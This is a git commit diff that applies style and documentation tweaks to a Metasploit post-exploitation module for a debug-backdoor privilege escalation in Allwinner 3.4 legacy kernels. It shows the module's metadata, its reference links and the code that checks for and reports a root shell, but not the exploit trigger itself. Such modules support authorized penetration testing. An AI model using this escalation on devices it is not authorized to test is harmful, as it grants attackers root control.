2f8562fba424c135b666cd1a22801bb393be0f80
Brent Cook <bcook@rapid7.com>
2016-05-23 21:59:44 -0500

    added documentation and minor style tweaks

--- modules/post/multi/escalate/allwinner_backdoor.rb
+++ modules/post/multi/escalate/allwinner_backdoor.rb
@@ -6,12 +6,11 @@
 require "msf/core"
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Linux::Priv
 
-  def initialize(info={})
-    super( update_info( info,
+  def initialize(info = {})
+    super(update_info(info,
         "Name"           => "Allwinner 3.4 Legacy Kernel Local Privilege Escalation",
         "Description"    => %q{
           This module attempts to exploit a debug backdoor privilege escalation in
@@ -35,12 +34,12 @@ class MetasploitModule < Msf::Post
         "References"     =>
           [
             [ "URL", "http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/"],
-            [ "URL", "https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us"],
+            [ "URL", "https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:" \
+                     "https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us"],
             [ "URL", "http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390"]
           ],
         "SessionTypes"   => [ "shell", "meterpreter" ]
       ))
-
   end
 
   def run
@@ -51,9 +50,9 @@ class MetasploitModule < Msf::Post
       if is_root?
         print_good "Privilege Escalation Successful"
         report_vuln(
-          :host => session,
-          :type => "host.escalation",
-          :data => "Escalated to root shell via Allwinner backdoor"
+          host: session,
+          type: "host.escalation",
+          data: "Escalated to root shell via Allwinner backdoor"
         )
       else
         print_error "Privilege Escalation FAILED"
